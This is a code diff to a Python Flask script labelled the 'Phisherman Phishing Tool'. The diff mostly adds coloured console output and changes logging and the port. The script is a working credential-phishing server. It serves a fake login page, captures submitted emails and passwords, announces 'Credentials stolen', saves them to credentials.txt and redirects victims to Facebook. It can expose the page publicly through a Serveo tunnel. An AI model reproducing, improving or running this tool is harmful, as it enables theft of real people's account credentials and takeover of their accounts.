@@ -1,6 +1,13 @@
 from flask import Flask, render_template, request, redirect, url_for
 import logging, socket, argparse
 
+# ANSI color codes
+RESET = '\033[0m'
+GREEN = '\033[92m'
+CYAN = '\033[96m'
+YELLOW = '\033[93m'
+MAGENTA = '\033[95m'
+
 parser = argparse.ArgumentParser(description='Phisherman Phishing Tool')
 """parser.add_argument('serveo', metavar='Serveo Link', type=str, help='The Link For Serveo' default='')
 parser.add_argument('ngrok', metavar='Ngrok Link', type=str, help='The Link For Ngrok' default='')
@@ -15,9 +22,9 @@ app = Flask(__name__, template_folder='./', static_url_path='/static')
 
 @app.route('/')
 def home():
-    ip = ''
-    print("\n    ✔️Target captured...")
-    print(f" IP: {ip}")
+    ip = '[...]'
+    print(f"\n{GREEN}    ✔️Target captured...{RESET}")
+    print(f"{CYAN} IP: {ip}{RESET}")
     return render_template(f'{page}.html')
 
 @app.route('/login', methods=['POST'])
@@ -26,13 +33,13 @@ def login():
     password = request.form.get('pwd')
     print(email)
     if email and password:
-        print("          --------------------- ")
-        print("          ✔️ Credentials stolen...")
-        print(f'          -> Email: {email}')
-        print(f'          ->Password: {password}')
+        print(f"{YELLOW}          --------------------- {RESET}")
+        print(f"{GREEN}          ✔️ Credentials stolen...{RESET}")
+        print(f'{CYAN}          -> Email:|{email}|{RESET}')
+        print(f'{CYAN}          -> Password:|{password}|{RESET}')
         save_credentials(email, password)
-        print('    ️      ✔️ Credentials saved at credentials.txt')
-        print("          --------------------- \n")
+        print(f'{GREEN}    ️      ✔️ Credentials saved at credentials.txt{RESET}')
+        print(f"{YELLOW}          --------------------- {RESET}\n")
         return redirect('https://viewpoints.fb.com/')
     return redirect('https://www.facebook.com/recover')
 
@@ -74,22 +81,23 @@ def save_credentials(email, password):
 
 if __name__ == '__main__':
     app.logger.disabled = True
-    #alog = logging.getLogger('werkzeug')
-    #alog.setLevel(logging.ERROR)
-    page = input("    Enter page number >>>  ")
-    
-    print ("        👉 Select any of the following to obtain the link ")
-    print("          ------------------------------- ")
-    print( "          | Code   |  Name             | " )
-    print("          ------------------------------- ")
-    print( "          | 01     |  Localhost(Local  | " )
-    print( "          | 02     |  Serveo(Public)   | " )
-    print("          ------------------------------- ")
-    print("")
-    public_url = input ("    >>> ")
+    alog = logging.getLogger('werkzeug')
+    alog.setLevel(logging.ERROR)
+    page = input(f"{MAGENTA}    Enter template number >>>  {RESET}")
+
+    print(f"{MAGENTA}        👉 Select any of the following to obtain the link {RESET}")
+    print(f"{CYAN}          ------------------------------- {RESET}")
+    print(f"{CYAN}          | Code   |  Name             | {RESET}")
+    print(f"{CYAN}          ------------------------------- {RESET}")
+    print(f"{CYAN}          | {YELLOW}01     {CYAN}|  {MAGENTA}Localhost(Local) {CYAN}| {RESET}")
+    print(f"{CYAN}          | {YELLOW}02     {CYAN}|  {MAGENTA}Serveo(Public)   {CYAN}| {RESET}")
+    print(f"{CYAN}          ------------------------------- {RESET}\n")
+
+    public_url = input(f"{MAGENTA}    >>> {RESET}")
+
     if public_url == "02":
-        print ("    Starting Serveo Tunnel ...")
+        print(f"{GREEN}    Starting Serveo Tunnel ...{RESET}")
         from expose import Serveo_Link
-        Serveo_Link();
-    #print_ips()
-    app.run(host='0.0.0.0', port=8080)
+        Serveo_Link()
+
+    app.run(host='0.0.0.0', port=2095)
